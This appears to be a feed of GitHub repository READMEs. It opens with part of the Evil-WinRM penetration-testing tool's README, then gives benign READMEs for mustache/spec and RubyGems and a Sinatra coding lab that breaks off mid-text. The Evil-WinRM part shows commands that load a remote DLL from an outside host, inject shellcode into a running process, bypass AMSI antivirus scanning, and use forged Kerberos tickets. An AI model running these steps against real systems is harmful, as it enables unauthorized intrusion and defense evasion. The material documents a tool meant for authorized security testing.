&#xA;&lt;pre&gt;&lt;code&gt;*Evil-WinRM* PS C:\&amp;gt; Dll-Loader&#xA;.SYNOPSIS&#xA;    dll loader.&#xA;    PowerShell Function: Dll-Loader&#xA;    Author: Hector de Armas (3v4Si0N)&#xA;&#xA;    Required dependencies: None&#xA;    Optional dependencies: None&#xA;.DESCRIPTION&#xA;    .&#xA;.EXAMPLE&#xA;    Dll-Loader -smb -path \\192.168.139.132\\share\\myDll.dll&#xA;    Dll-Loader -local -path C:\Users\Pepito\Desktop\myDll.dll&#xA;    Dll-Loader -http -path http://example.com/myDll.dll&#xA;&#xA;    Description&#xA;    -----------&#xA;    Function that loads an arbitrary dll&#xA;&#xA;*Evil-WinRM* PS C:\&amp;gt; Dll-Loader -http http://10.10.10.10/SharpSploit.dll&#xA;[+] Reading dll by HTTP&#xA;[+] Loading dll...&#xA;*Evil-WinRM* PS C:\Users\test\Documents&amp;gt; menu&#xA;&#xA; [... Snip ...]&#xA;&#xA;*Evil-WinRM* PS C:\&amp;gt; [SharpSploit.Enumeration.Host]::GetProcessList()&#xA;&#xA;&#xA;Pid          : 0&#xA;Ppid         : 0&#xA;Name         : Idle&#xA;Path         :&#xA;SessionID    : 0&#xA;Owner        :&#xA;Architecture : x64&#xA;&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;Donut-Loader: allows to inject x64 payloads generated with awesome &lt;a href=&#34;https://github.com/TheWover/donut&#34;&gt;donut&lt;/a&gt; technique. No need to encode the payload.bin, just generate and inject!&lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;pre&gt;&lt;code&gt;*Evil-WinRM* PS C:\&amp;gt; Donut-Loader&#xA;.SYNOPSIS&#xA;    Donut Loader.&#xA;    PowerShell Function: Donut-Loader&#xA;    Author: Luis Vacas (CyberVaca)&#xA;    Based code: TheWover&#xA;&#xA;    Required dependencies: None&#xA;    Optional dependencies: None&#xA;.DESCRIPTION&#xA;&#xA;.EXAMPLE&#xA;    Donut-Loader -process_id 2195 -donutfile /home/cybervaca/donut.bin&#xA;    Donut-Loader -process_id (get-process notepad).id -donutfile /home/cybervaca/donut.bin&#xA;&#xA;    Description&#xA;    -----------&#xA;    Function that loads an arbitrary donut :D&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;You can use this &lt;a href=&#34;https://github.com/Hackplayers/Salsa-tools/raw/master/Donut-Maker/donut-maker.py&#34;&gt;donut-maker&lt;/a&gt; to generate the payload.bin if you don&#39;t use Windows. This script use a python module written by Marcello Salvati (&lt;a href=&#34;https://twitter.com/byt3bl33d3r&#34;&gt;byt3bl33d3r&lt;/a&gt;). It could be installed using pip: &lt;code&gt;pip3 install donut-shellcode&lt;/code&gt;&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code&gt;python3 donut-maker.py -i Covenant.exe&#xA;&#xA;   ___  _____&#xA; .&#39;/,-Y&#34;     &#34;~-.&#xA; l.Y             ^.&#xA; /\               _\_      Donuts!&#xA;i            ___/&#34;   &#34;\&#xA;|          /&#34;   &#34;\   o !&#xA;l         ]     o !__./&#xA; \ _  _    \.___./    &#34;~\&#xA;  X \/ \            ___./&#xA; ( \ ___.   _..--~~&#34;   ~`-.&#xA;  ` Z,--   /               \&#xA;    \__.  (   /       ______)&#xA;      \   l  /-----~~&#34; /&#xA;       Y   \          /&#xA;       |    &#34;x______.^&#xA;       |           \&#xA;       j            Y&#xA;&#xA;&#xA;&#xA;[+] Donut generated successfully: payload.bin&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;Bypass-4MSI: patchs AMSI protection.&lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;pre&gt;&lt;code&gt;*Evil-WinRM* PS C:\&amp;gt; #amsiscanbuffer&#xA;At line:1 char:1&#xA;+ #amsiscanbuffer&#xA;+ ~~~~~~~~~~~~~~~&#xA;This script contains malicious content and has been blocked by your antivirus software.&#xA;    + CategoryInfo          : ParserError: (:) [Invoke-Expression], ParseException&#xA;    + FullyQualifiedErrorId : ScriptContainedMaliciousContent,Microsoft.PowerShell.Commands.InvokeExpressionCommand&#xA;*Evil-WinRM* PS C:\&amp;gt;&#xA;*Evil-WinRM* PS C:\&amp;gt; Bypass-4MSI&#xA;[+] Success!&#xA;&#xA;*Evil-WinRM* PS C:\&amp;gt; #amsiscanbuffer&#xA;*Evil-WinRM* PS C:\&amp;gt;&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;h3&gt;Kerberos&lt;/h3&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt; &lt;p&gt;First you have to sync date with the DC: &lt;code&gt;rdate -n &amp;lt;dc_ip&amp;gt;&lt;/code&gt;&lt;/p&gt; &lt;/li&gt; &#xA; &lt;li&gt; &lt;p&gt;To generate ticket there are many ways:&lt;/p&gt; &#xA;  &lt;ul&gt; &#xA;   &lt;li&gt;Using &lt;a href=&#34;https://github.com/SecureAuthCorp/impacket/raw/master/examples/ticketer.py&#34;&gt;ticketer.py&lt;/a&gt; from impacket&lt;/li&gt; &#xA;   &lt;li&gt;If you get a kirbi ticket using &lt;a href=&#34;https://github.com/GhostPack/Rubeus&#34;&gt;Rubeus&lt;/a&gt; or &lt;a href=&#34;https://github.com/gentilkiwi/mimikatz&#34;&gt;Mimikatz&lt;/a&gt; you have to convert to ccache using &lt;a href=&#34;https://github.com/Zer1t0/ticket_converter&#34;&gt;ticket_converter.py&lt;/a&gt;&lt;/li&gt; &#xA;  &lt;/ul&gt; &lt;/li&gt; &#xA; &lt;li&gt; &lt;p&gt;Add ccache ticket. There are 2 ways:&lt;/p&gt; &lt;p&gt;&lt;code&gt;export KRB5CCNAME=/foo/var/ticket.ccache&lt;/code&gt;&lt;/p&gt; &lt;p&gt;&lt;code&gt;cp ticket.ccache /tmp/krb5cc_0&lt;/code&gt;&lt;/p&gt; &lt;/li&gt; &#xA; &lt;li&gt; &lt;p&gt;Add realm to &lt;code&gt;/etc/krb5.conf&lt;/code&gt; (for linux). Use of this format is important:&lt;/p&gt; &lt;pre&gt;&lt;code&gt; CONTOSO.COM = {&#xA;             kdc = fooserver.contoso.com&#xA; }&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA; &lt;li&gt; &lt;p&gt;Check Kerberos tickets with &lt;code&gt;klist&lt;/code&gt;&lt;/p&gt; &lt;/li&gt; &#xA; &lt;li&gt; &lt;p&gt;To remove ticket use: &lt;code&gt;kdestroy&lt;/code&gt;&lt;/p&gt; &lt;/li&gt; &#xA; &lt;li&gt; &lt;p&gt;For more information about Kerberos check this &lt;a href=&#34;https://gist.github.com/TarlogicSecurity/2f221924fef8c14a1d8e29f3cb5c5c4a&#34;&gt;cheatsheet&lt;/a&gt;&lt;/p&gt; &lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;h3&gt;Remote path completion&lt;/h3&gt; &#xA;&lt;p&gt;This feature could be not available depending of the ruby you are using. It must be compiled with readline support. Otherwise, this feature will not work (a warning will be shown).&lt;/p&gt; &#xA;&lt;h4&gt;Method 1 (compile the needed extension)&lt;/h4&gt; &#xA;&lt;p&gt;Using this method you&#39;ll compile ruby with the needed readline feature but to use only the library without changing the default ruby version on your system. Because of this, is the most recommended method.&lt;/p&gt; &#xA;&lt;p&gt;Let&#39;s suppose that you have in your Debian based system ruby 2.7.3:&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code&gt;# Install needed package&#xA;apt install libreadline-dev&#xA;&#xA;# Check your ruby version&#xA;ruby --version&#xA;ruby 2.7.3p183 (2021-04-05 revision 6847ee089d) [x86_64-linux-gnu]&#xA;&#xA;# Download ruby source code (2.7.3 in this case):&#xA;wget https://ftp.ruby-lang.org/pub/ruby/2.7/ruby-2.7.3.tar.gz&#xA;&#xA;# Extract source code&#xA;tar -xf ruby-2.7.3.tar.gz&#xA;&#xA;# Compile the readline extension:&#xA;cd ruby-2.7.3/ext/readline&#xA;ruby ./extconf.rb&#xA;make&#xA;&#xA;# Patch current version of the ruby readline extension:&#xA;sudo cp /usr/lib/x86_64-linux-gnu/ruby/2.7.0/readline.so /usr/lib/x86_64-linux-gnu/ruby/2.7.0/readline.so.bk&#xA;sudo cp -f readline.so /usr/lib/x86_64-linux-gnu/ruby/2.7.0/readline.so&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;h4&gt;Method 2 (Install ruby to use it only for evil-winrm using rbenv)&lt;/h4&gt; &#xA;&lt;p&gt;Let&#39;s suppose that you want ruby 2.7.1 on a Debian based Linux and you are using zsh. This script will automatize it. You&#39;ll need to launch it from the same dir where evil-winrm.rb and Gemfile is located (the evil-winrm created dir after a git clone for example):&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code&gt;#!/usr/bin/env zsh&#xA;&#xA;# Uninstall possible current installed versions&#xA;sudo gem uninstall evil-winrm -q&#xA;gem uninstall evil-winrm -q&#xA;&#xA;# Install rbenv&#xA;sudo apt install rbenv&#xA;&#xA;# Config rbenv on zshrc config file&#xA;echo &#39;export PATH=&#34;$HOME/.rbenv/bin:$PATH&#34;&#39; &amp;gt;&amp;gt; ~/.zshrc&#xA;echo &#39;eval &#34;$(rbenv init -)&#34;&#39; &amp;gt;&amp;gt; ~/.zshrc&#xA;source ~/.zshrc&#xA;&#xA;# Install ruby with readline support&#xA;export RUBY_CONFIGURE_OPTS=--with-readline-dir=&#34;/usr/include/readline&#34;&#xA;rbenv install 2.7.1&#xA;&#xA;# Create file &#39;.ruby-version&#39; to set right ruby version&#xA;rbenv local 2.7.1&#xA;&#xA;# Install local gems&#xA;gem install bundler&#xA;bundle install&#xA;&#xA;current_evwr=&#34;$(pwd)/evil-winrm.rb&#34;&#xA;&#xA;sudo bash -c &#34;cat &amp;lt;&amp;lt; &#39;EOF&#39; &amp;gt; /usr/bin/evil-winrm&#xA;    #!/usr/bin/env sh&#xA;    &#34;${current_evwr}&#34; &#34;\$@&#34;&#xA;EOF&#34;&#xA;&#xA;sudo chmod +x /usr/bin/evil-winrm&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;Then you can safely launch evil-winrm using the new installed ruby with the required readline support from any location.&lt;/p&gt; &#xA;&lt;h4&gt;Method 3 (compile entire ruby)&lt;/h4&gt; &#xA;&lt;p&gt;If you want to compile it yourself, you can follow these steps. Let&#39;s suppose that you want ruby 2.7.3:&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code&gt;wget -O ruby-install-0.8.1.tar.gz https://github.com/postmodern/ruby-install/archive/v0.8.1.tar.gz&#xA;tar -xzvf ruby-install-0.8.1.tar.gz&#xA;cd ruby-install-0.8.1/&#xA;sudo make install&#xA;ruby-install ruby 2.7.3 -- --with-readline-dir=/usr/include/readline&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;Depending of your system it will be installed at &lt;code&gt;/opt/rubies/ruby-2.7.3&lt;/code&gt; or maybe at &lt;code&gt; ~/.rubies/ruby-2.7.3&lt;/code&gt;.&lt;/p&gt; &#xA;&lt;p&gt;Now just need to install evil-winrm dependencies for that new installed ruby version. The easiest way is to launch command &lt;code&gt;/opt/rubies/ruby-2.7.3/bin/gem install evil-winrm&lt;/code&gt;. The gem command used must be belonging to the new ruby installation.&lt;/p&gt; &#xA;&lt;p&gt;After that, you can launch safely your new installed ruby to use it on evil-winrm: &lt;code&gt;/opt/rubies/ruby-2.7.3/bin/ruby ./evil-winrm.rb -h&lt;/code&gt;&lt;/p&gt; &#xA;&lt;p&gt;It is recommended to use this new installed ruby only to launch evil-winrm. If you set it up as your default ruby for your system, bear in mind that it has no dependency gems installed. Some ruby based software like Metasploit or others could not start correctly due dependencies problems.&lt;/p&gt; &#xA;&lt;h3&gt;Logging&lt;/h3&gt; &#xA;&lt;p&gt;This feature will create files on your $HOME dir saving commands and the outputs of the WinRM sessions&lt;/p&gt; &#xA;&lt;h2&gt;Changelog:&lt;/h2&gt; &#xA;&lt;p&gt;Changelog and project changes can be checked here: &lt;a href=&#34;https://raw.githubusercontent.com/Hackplayers/evil-winrm/master/CHANGELOG.md&#34;&gt;CHANGELOG.md&lt;/a&gt;&lt;/p&gt; &#xA;&lt;h2&gt;Credits:&lt;/h2&gt; &#xA;&lt;p&gt;Staff:&lt;/p&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://github.com/cybervaca&#34;&gt;Cybervaca&lt;/a&gt;, (founder). Twitter: &lt;a href=&#34;https://twitter.com/CyberVaca_&#34;&gt;@CyberVaca_&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://github.com/OscarAkaElvis&#34;&gt;OscarAkaElvis&lt;/a&gt;, Twitter: &lt;a href=&#34;https://twitter.com/OscarAkaElvis&#34;&gt;@OscarAkaElvis&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://github.com/jarilaos&#34;&gt;Jarilaos&lt;/a&gt;, Twitter: &lt;a href=&#34;https://twitter.com/_Laox&#34;&gt;@_Laox&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://github.com/arale61&#34;&gt;arale61&lt;/a&gt;, Twitter: &lt;a href=&#34;https://twitter.com/arale61&#34;&gt;@arale61&lt;/a&gt;&lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;p&gt;Hat tip to:&lt;/p&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://github.com/vmotos&#34;&gt;Vis0r&lt;/a&gt; for his personal support.&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://github.com/Alamot&#34;&gt;Alamot&lt;/a&gt; for his original code.&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://github.com/3v4Si0N&#34;&gt;3v4Si0N&lt;/a&gt; for his awesome dll loader.&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://github.com/WinRb/WinRM/graphs/contributors&#34;&gt;WinRb&lt;/a&gt; All contributors of ruby library.&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://github.com/TheWover&#34;&gt;TheWover&lt;/a&gt; for his awesome donut tool.&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://twitter.com/byt3bl33d3r&#34;&gt;byt3bl33d3r&lt;/a&gt; for his python library to create donut payloads.&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://github.com/Sh11td0wn&#34;&gt;Sh11td0wn&lt;/a&gt; for inspiration about new features.&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://github.com/Stoo0rmq&#34;&gt;Borch&lt;/a&gt; for his help adding logging feature.&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://www.hackplayers.com/&#34;&gt;Hackplayers&lt;/a&gt; for giving a shelter on their github to this software.&lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;h2&gt;Disclaimer &amp;amp; License&lt;/h2&gt; &#xA;&lt;p&gt;This script is licensed under LGPLv3+. Direct link to &lt;a href=&#34;https://raw.githubusercontent.com/Hackplayers/evil-winrm/master/LICENSE&#34;&gt;License&lt;/a&gt;.&lt;/p&gt; &#xA;&lt;p&gt;Evil-WinRM should be used for authorized penetration testing and/or nonprofit educational purposes only. Any misuse of this software will not be the responsibility of the author or of any other collaborator. Use it at your own servers and/or with the server owner&#39;s permission.&lt;/p&gt; &#xA;&lt;!-- Github URLs --&gt; &#xA;&lt;!-- Twitter URLs --&gt; &#xA;&lt;!-- Badges URLs --&gt;</summary>
  </entry>
  <entry>
    <title>mustache/spec</title>
    <updated>2022-05-30T01:32:15Z</updated>
    <id>tag:github.com,2022-05-30:/mustache/spec</id>
    <link href="https://github.com/mustache/spec" rel="alternate"></link>
    <summary type="html">&lt;p&gt;The Mustache spec.&lt;/p&gt;&lt;hr&gt;&lt;p&gt;The repository at &lt;a href=&#34;https://github.com/mustache/spec&#34;&gt;https://github.com/mustache/spec&lt;/a&gt; is the formal standard for Mustache. It defines both normal usage and edge-case behavior for libraries parsing the Mustache templating language (or a superset thereof).&lt;/p&gt; &#xA;&lt;p&gt;The specification is developed as a series of YAML files, under the &lt;code&gt;specs&lt;/code&gt; directory.&lt;/p&gt; &#xA;&lt;h2&gt;Versioning&lt;/h2&gt; &#xA;&lt;p&gt;This specification is being &lt;a href=&#34;http://semver.org&#34;&gt;semantically versioned&lt;/a&gt;. Roughly described, major version changes will always represent backwards incompatible changes, minor version changes will always represent new language features and will be backwards compatible, and patch (&#39;tiny&#39;) version changes will always be bug fixes. For the purposes of semantic versioning, the public API is the contents of the &lt;code&gt;specs&lt;/code&gt; directory and the algorithm for testing against it.&lt;/p&gt; &#xA;&lt;p&gt;Mustache implementations SHOULD report the most recent version of the spec (major and minor version numbers). If an implementation has support for any optional modules, they SHOULD indicate so with a remark attached to the version number (e.g. &#34;vX.Y, including lambdas&#34; or &#34;v.X.Y+λ&#34;). It is RECOMMENDED that implementations not supporting at least v1.0.0 of this spec refer to themselves as &#34;Mustache-like&#34;, or &#34;Mustache-inspired&#34;.&lt;/p&gt; &#xA;&lt;h2&gt;Alternate Formats&lt;/h2&gt; &#xA;&lt;p&gt;Since YAML is a reasonably complex format that not every language has good tools for working with, we also provide JSON versions of the specs on a best-effort basis.&lt;/p&gt; &#xA;&lt;p&gt;These should be identical to the YAML specifications, but if you find the need to regenerate them, they can be trivially rebuilt by invoking &lt;code&gt;rake build&lt;/code&gt;.&lt;/p&gt; &#xA;&lt;p&gt;It is also worth noting that some specifications (notably, the lambda module) rely on YAML &#34;tags&#34; to denote special types of data (e.g. source code). Since JSON offers no way to denote this, a special key (&#34;&lt;code&gt;__tag__&lt;/code&gt;&#34;) is injected with the name of the tag as its value. See &lt;code&gt;TESTING.md&lt;/code&gt; for more information about handling tagged data.&lt;/p&gt; &#xA;&lt;h2&gt;Optional Modules&lt;/h2&gt; &#xA;&lt;p&gt;Specification files beginning with a tilde (&lt;code&gt;~&lt;/code&gt;) describe optional modules. At present, the only module being described as optional is regarding support for lambdas. As a guideline, a module may be a candidate for optionality when:&lt;/p&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;It does not affect the core syntax of the language.&lt;/li&gt; &#xA; &lt;li&gt;It does not significantly affect the output of rendered templates.&lt;/li&gt; &#xA; &lt;li&gt;It concerns implementation language features or data types that are not common to or core in every targeted language.&lt;/li&gt; &#xA; &lt;li&gt;The lack of support by an implementation does not diminish the usage of Mustache in the target language.&lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;p&gt;As an example, the lambda module is primarily concerned with the handling of a particular data type (code). This is a type of data that may be difficult to support in some languages, and users of those languages will not see the lack as an &#39;inconsistency&#39; between implementations.&lt;/p&gt; &#xA;&lt;p&gt;Support for specific pragmas or syntax extensions, however, are best managed outside this core specification, as adjunct specifications.&lt;/p&gt; &#xA;&lt;p&gt;Implementors are strongly encouraged to support any and all modules they are reasonably capable of supporting.&lt;/p&gt;</summary>
  </entry>
  <entry>
    <title>rubygems/rubygems</title>
    <updated>2022-05-30T01:32:15Z</updated>
    <id>tag:github.com,2022-05-30:/rubygems/rubygems</id>
    <link href="https://github.com/rubygems/rubygems" rel="alternate"></link>
    <summary type="html">&lt;p&gt;Library packaging and distribution for Ruby.&lt;/p&gt;&lt;hr&gt;&lt;h1&gt;RubyGems &lt;a href=&#34;https://codeclimate.com/github/rubygems/rubygems/maintainability&#34;&gt;&lt;img src=&#34;https://api.codeclimate.com/v1/badges/30f913e9c2dd932132c1/maintainability&#34; alt=&#34;Maintainability&#34;&gt;&lt;/a&gt;&lt;/h1&gt; &#xA;&lt;p&gt;RubyGems is a package management framework for Ruby.&lt;/p&gt; &#xA;&lt;p&gt;A package (also known as a library) contains a set of functionality that can be invoked by a Ruby program, such as reading and parsing an XML file. We call these packages &#34;gems&#34; and RubyGems is a tool to install, create, manage and load these packages in your Ruby environment.&lt;/p&gt; &#xA;&lt;p&gt;RubyGems is also a client for &lt;a href=&#34;https://rubygems.org&#34;&gt;RubyGems.org&lt;/a&gt;, a public repository of Gems that allows you to publish a Gem that can be shared and used by other developers. See our guide on publishing a Gem at &lt;a href=&#34;https://guides.rubygems.org/publishing/&#34;&gt;guides.rubygems.org&lt;/a&gt;&lt;/p&gt; &#xA;&lt;h2&gt;Getting Started&lt;/h2&gt; &#xA;&lt;p&gt;Installing and managing a Gem is done through the &lt;code&gt;gem&lt;/code&gt; command. To install a Gem such as &lt;a href=&#34;https://github.com/sparklemotion/nokogiri&#34;&gt;Nokogiri&lt;/a&gt; which lets you read and parse XML in Ruby:&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code&gt;$ gem install nokogiri&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;RubyGems will download the Nokogiri Gem from RubyGems.org and install it into your Ruby environment.&lt;/p&gt; &#xA;&lt;p&gt;Finally, inside your Ruby program, load the Nokogiri gem and start parsing your XML:&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code&gt;require &#39;nokogiri&#39;&#xA;&#xA;Nokogiri.XML(&#39;&amp;lt;h1&amp;gt;Hello World&amp;lt;/h1&amp;gt;&#39;)&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;For more information about how to use RubyGems, see our RubyGems basics guide at &lt;a href=&#34;https://guides.rubygems.org/rubygems-basics/&#34;&gt;guides.rubygems.org&lt;/a&gt;&lt;/p&gt; &#xA;&lt;h2&gt;Requirements&lt;/h2&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;RubyGems 2.6 supports Ruby 2.4 or lower.&lt;/li&gt; &#xA; &lt;li&gt;RubyGems 2.7 supports Ruby 2.5 or lower.&lt;/li&gt; &#xA; &lt;li&gt;RubyGems 3.0 supports Ruby 2.3 or later.&lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;h2&gt;Installation&lt;/h2&gt; &#xA;&lt;p&gt;RubyGems is already installed in your Ruby environment, you can check the version you have installed by running &lt;code&gt;gem --version&lt;/code&gt; in your terminal emulator.&lt;/p&gt; &#xA;&lt;p&gt;In some cases Ruby &amp;amp; RubyGems may be provided as OS packages. This is not a recommended way to use Ruby &amp;amp; RubyGems. It&#39;s better to use a Ruby Version Manager, such as &lt;a href=&#34;https://github.com/rbenv/rbenv&#34;&gt;rbenv&lt;/a&gt; or &lt;a href=&#34;https://github.com/postmodern/chruby&#34;&gt;chruby&lt;/a&gt;. If you still want to use the version provided by your OS package manager, please also use your OS package manager to upgrade rubygems, and disregard any other installation instructions given below.&lt;/p&gt; &#xA;&lt;p&gt;If you would like to manually install RubyGems:&lt;/p&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;Download from &lt;a href=&#34;https://rubygems.org/pages/download&#34;&gt;https://rubygems.org/pages/download&lt;/a&gt;, unpack, and &lt;code&gt;cd&lt;/code&gt; into RubyGems&#39; src&lt;/li&gt; &#xA; &lt;li&gt;OR clone this repository and &lt;code&gt;cd&lt;/code&gt; into the repository&lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;p&gt;Install RubyGems by running:&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code&gt;$ ruby setup.rb&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;For more details and other options, see:&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code&gt;$ ruby setup.rb --help&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;h2&gt;Upgrading RubyGems&lt;/h2&gt; &#xA;&lt;p&gt;To upgrade to the latest RubyGems, run:&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code&gt;$ gem update --system&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;See &lt;a href=&#34;https://raw.githubusercontent.com/rubygems/rubygems/master/UPGRADING.md&#34;&gt;UPGRADING&lt;/a&gt; for more details and alternative instructions.&lt;/p&gt; &#xA;&lt;h2&gt;Documentation&lt;/h2&gt; &#xA;&lt;p&gt;RubyGems uses &lt;a href=&#34;https://github.com/rdoc/rdoc&#34;&gt;rdoc&lt;/a&gt; for documentation. A compiled set of the docs can be viewed online at &lt;a href=&#34;https://www.rubydoc.info/github/rubygems/rubygems&#34;&gt;rubydoc&lt;/a&gt;.&lt;/p&gt; &#xA;&lt;p&gt;RubyGems also provides a comprehensive set of guides which covers numerous topics such as creating a new gem, security practices and other resources at &lt;a href=&#34;https://guides.rubygems.org&#34;&gt;https://guides.rubygems.org&lt;/a&gt;&lt;/p&gt; &#xA;&lt;h2&gt;Getting Help&lt;/h2&gt; &#xA;&lt;h3&gt;Filing Tickets&lt;/h3&gt; &#xA;&lt;p&gt;Got a bug and you&#39;re not sure? You&#39;re sure you have a bug, but don&#39;t know what to do next? In any case, let us know about it! The best place for letting the RubyGems team know about bugs or problems you&#39;re having is &lt;a href=&#34;http://github.com/rubygems/rubygems/issues&#34;&gt;on the RubyGems issues page at GitHub&lt;/a&gt;.&lt;/p&gt; &#xA;&lt;h3&gt;Bundler Compatibility&lt;/h3&gt; &#xA;&lt;p&gt;See &lt;a href=&#34;http://bundler.io/compatibility&#34;&gt;http://bundler.io/compatibility&lt;/a&gt; for known issues.&lt;/p&gt; &#xA;&lt;h3&gt;Supporting&lt;/h3&gt; &#xA;&lt;p&gt;&lt;a href=&#34;https://rubytogether.org/&#34;&gt;&lt;img src=&#34;https://rubytogether.org/images/rubies.svg?sanitize=true&#34; width=&#34;200&#34;&gt;&lt;/a&gt;&lt;br&gt; &lt;a href=&#34;https://rubytogether.org/&#34;&gt;Ruby Together&lt;/a&gt; pays some RubyGems maintainers for their ongoing work. As a grassroots initiative committed to supporting the critical Ruby infrastructure you rely on, Ruby Together is funded entirely by the Ruby community. Contribute today &lt;a href=&#34;https://rubytogether.org/developers&#34;&gt;as an individual&lt;/a&gt; or even better, &lt;a href=&#34;https://rubytogether.org/companies&#34;&gt;as a company&lt;/a&gt;, and ensure that RubyGems, Bundler, and other shared tooling is around for years to come.&lt;/p&gt; &#xA;&lt;h3&gt;Contributing&lt;/h3&gt; &#xA;&lt;p&gt;If you&#39;d like to contribute to RubyGems, that&#39;s awesome, and we &amp;lt;3 you. Check out our &lt;a href=&#34;https://raw.githubusercontent.com/rubygems/rubygems/master/CONTRIBUTING.md&#34;&gt;guide to contributing&lt;/a&gt; for more information.&lt;/p&gt; &#xA;&lt;p&gt;While some RubyGems contributors are compensated by Ruby Together, the project maintainers make decisions independent of Ruby Together. As a project, we welcome contributions regardless of the author’s affiliation with Ruby Together.&lt;/p&gt; &#xA;&lt;h3&gt;Code of Conduct&lt;/h3&gt; &#xA;&lt;p&gt;Everyone interacting in the RubyGems project’s codebases, issue trackers, chat rooms, and mailing lists is expected to follow the &lt;a href=&#34;https://github.com/rubygems/rubygems/raw/master/CODE_OF_CONDUCT.md&#34;&gt;contributor code of conduct&lt;/a&gt;.&lt;/p&gt;</summary>
  </entry>
  <entry>
    <title>learn-co-curriculum/phase-3-sinatra-with-active-record-post-patch-delete-lab</title>
    <updated>2022-05-30T01:32:15Z</updated>
    <id>tag:github.com,2022-05-30:/learn-co-curriculum/phase-3-sinatra-with-active-record-post-patch-delete-lab</id>
    <link href="https://github.com/learn-co-curriculum/phase-3-sinatra-with-active-record-post-patch-delete-lab" rel="alternate"></link>
    <summary type="html">&lt;p&gt;&lt;/p&gt;&lt;hr&gt;&lt;h1&gt;Sinatra with Active Record: POST/PATCH/DELETE Requests Lab&lt;/h1&gt; &#xA;&lt;h2&gt;Learning Goals&lt;/h2&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;Handle non-&lt;code&gt;GET&lt;/code&gt; requests in a controller&lt;/li&gt; &#xA; &lt;li&gt;Access data in the request body with the params hash&lt;/li&gt; &#xA; &lt;li&gt;Perform CRUD actions with Active Record from the controller&lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;h2&gt;Setup&lt;/h2&gt; &#xA;&lt;p&gt;In this application, we&#39;ll continue working on our JSON API for the bakeries domain. As a reminder, here&#39;s what the ERD for these tables looks like:&lt;/p&gt; &#xA;&lt;p&gt;&lt;img src=&#34;https://curriculum-content.s3.amazonaws.com/phase-3/sinatra-with-active-record-get-lab/bakeries-baked_goods-erd.png&#34; alt=&#34;Bakeries ERD&#34;&gt;&lt;/p&gt; &#xA;&lt;p&gt;To set up the application, run these commands:&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-console&#34;&gt;$ bundle install&#xA;$ bundle exec rake db:migrate db:seed&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;You can run the app and explore your API in the Postman by using the custom Rake task:&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-console&#34;&gt;$ bundle exec rake server&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;h2&gt;Instructions&lt;/h2&gt; &#xA;&lt;p&gt;This is a test-driven lab, so run the tests to get started! This lab builds on the other lessons from this sections, so some of the tests are already passing; the associations between the models have been built out already, so a good place to start might be by working on adding routes to the &lt;code&gt;ApplicationController&lt;/code&gt; for the different endpoints described in the test spec.&lt;/p&gt; &#xA;&lt;p&gt;You should also test your routes using Postman as you go in order to get a sense of how to send data to and receive data from the server.&lt;/p&gt; &#xA;&lt;h3&gt;Routes&lt;/h3&gt; &#xA;&lt;p&gt;Define routes that do the following:&lt;/p&gt; &#xA;&lt;p&gt;&lt;code&gt;POST /baked_goods&lt;/code&gt;: creates a new baked good in the database, and returns data for the newly created baked good as JSON. The request will receive an object like this as params:&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code 